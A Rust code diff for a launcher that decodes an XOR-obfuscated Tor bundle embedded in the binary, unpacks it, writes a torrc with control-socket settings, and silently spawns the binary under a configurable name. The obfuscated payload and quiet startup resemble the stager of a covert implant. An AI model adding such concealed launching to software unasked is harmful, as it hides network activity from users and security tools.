@@ -2,63 +2,29 @@ mod config;
 mod xor;
 mod setting;
 
+use std::{io, error};
 use std::fs::File;
-use std::path::PathBuf;
-use std::{io, thread, time, error};
+use std::path::{PathBuf};
+use std::process::{Command, Stdio};
 
 fn main() -> Result<(), Box<dyn error::Error>> {
     let setting: setting::Setting = load_settings();
 
-    download_and_extract_tor(&setting)?;
-
-    start_tor_binary(&setting);
-
-    Ok(())
-}
-
-fn download_and_extract_tor(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
-    let mut attempts = 0;
-    let sleep_time = time::Duration::from_millis(5000);
-
-    let mut file: File = tempfile::tempfile()?;
-
-    loop {
-        if attempts > 4 {
-            return Result::Err(
-                String::from("reached maximum download attempts, aborting").into()
-            );
-        }
-
-        match download(&setting.tor_url, &mut file) {
-            Ok(_) => {
-                break;
-            },
-            Err(err) => {
-                println!("download failed with {:?}", err);
-                attempts += 1;
-            }
-        }
-        
-        thread::sleep(sleep_time);
-    };
-
     std::fs::create_dir_all(&setting.tor_dir)?;
+    
+    unbundle_tor(&setting)?;
 
-    let mut zip = zip::ZipArchive::new(file)?;
-    zip.extract(&setting.tor_dir)?;
+    let torrc = &setting.tor_dir.join("config");
+    unbundle_torrc(&torrc, &setting)?;
+
+    start_tor_binary(&torrc, &setting)?;
 
     Ok(())
 }
 
 fn load_settings() -> setting::Setting {
-    let key = String::from(config::ENC_KEY); 
-
-    let tor_url = xor::decode(
-        &key, 
-        &String::from(config::ENC_TOR_URL)
-    ).unwrap_or_else(|_| {
-        panic!("problem unserializing url");
-    });
+    let key = String::from(config::ENC_KEY);
+    let name = String::from(config::NAME);
 
     let tor_dir = xor::decode(
         &key,
@@ -75,11 +41,51 @@ fn load_settings() -> setting::Setting {
     });
 
     setting::Setting {
+        name,
         key,
-        tor_url,
         torrc,
         tor_dir: expand_user_dir(&tor_dir)
     }
+}
+
+fn unbundle_tor(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
+    let bundle = config::ENC_TOR_BUNDLE;
+    let bytes = xor::decode_bytes(&setting.key, &String::from(bundle))?;
+
+    let mut ar = tar::Archive::new(io::Cursor::new(&bytes));
+    ar.unpack(&setting.tor_dir.join("..").join(".."))?;
+    Ok(())
+}
+
+fn unbundle_torrc(
+    path: &PathBuf,
+    setting: &setting::Setting
+) -> Result<(), Box<dyn error::Error>> {
+    let mut contents = setting.torrc.clone();
+
+    if cfg!(linux) {
+        contents += "\nControlSocketsGroupWritable 1";
+        contents += "\nControlSocket @{CTRL_SOCKET}";
+    }
+
+    contents = contents.replace(
+        "@{DATA_DIR}",
+        setting.tor_dir.to_str().unwrap()
+    );
+
+    contents = contents.replace(
+        "@{CTRL_COOKIE}",
+        setting.tor_dir.join("ctrl.cookie").to_str().unwrap()
+    );
+
+    contents = contents.replace(
+        "@{CTRL_SOCKET}",
+        setting.tor_dir.join("ctrl.socket").to_str().unwrap()
+    );
+
+    std::fs::write(&path, &contents)?;
+
+    Ok(())
 }
 
 fn expand_user_dir(path: &String) -> PathBuf {
@@ -92,25 +98,27 @@ fn expand_user_dir(path: &String) -> PathBuf {
     home_dir
 }
 
-fn download(url: &String, out_file: &mut File) -> Result<(), ureq::Error> {
-    let res = match ureq::get(url).call() {
-        Ok(res) => res,
-        Err(err) => return Result::Err(err),
-    };
+fn start_tor_binary(
+    torrc: &PathBuf,
+    setting: &setting::Setting
+) -> Result<(), Box<dyn error::Error>> {
+    let mut executable = setting.tor_dir.join(&setting.name);
 
-    // File buffer to write download data
-    let mut writer = io::BufWriter::new(out_file);
+    if cfg!(windows) {
+        executable.set_extension("exe");
+    }
 
-    // Download stream reader
-    let mut reader = res.into_reader();
+    let log = setting.tor_dir.join("log.txt");
 
-    io::copy(&mut reader, &mut writer).unwrap_or_else(|error| {
-        panic!("problem writing download to file: {:?}", error);
-    });
+    let stdout: File = File::create(&log)?;
+    let stderr: File = File::create(&log)?;
 
-    Ok(())
-}
+    Command::new(executable)
+        .args(["-f", torrc.to_str().unwrap()])
+        .stdin(Stdio::null())
+        .stdout(stdout)
+        .stderr(stderr)
+        .spawn()?;
 
-fn start_tor_binary(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
     Ok(())
 }
